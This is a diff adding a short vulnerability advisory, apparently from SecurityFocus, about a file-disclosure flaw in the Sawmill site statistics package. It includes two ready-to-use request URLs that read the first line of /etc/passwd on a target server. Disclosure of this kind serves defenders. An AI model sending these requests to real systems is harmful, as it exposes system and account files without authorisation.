@@ -1,0 +1,11 @@
+source: http://www.securityfocus.com/bid/1402/info
+
+Sawmill is a site statistics package for Unix, Windows and Mac OS. A specially crafted request can disclose the first line of any world readable file for which the full pathname is known, for example /etc/passwd. The output of the request is similar to the following: 'Unknown configuration command "root:x:0:0:root:/root:/bin/sh" in "/etc/passwd".' 
+
+The following request will display the first line of /etc/passwd
+
+http://target:port/sawmill?rfcf+%22/etc/passwd%22+spbn+1,1,21,1,1,1,1,1,1,1,1,1+3
+
+If sawmill is run as a cgi script, the following can be used instead:
+
+http://target/cgi-bin/sawmill5?rfcf+%22/etc/passwd%22+spbn+1,1,21,1,1,1,1 
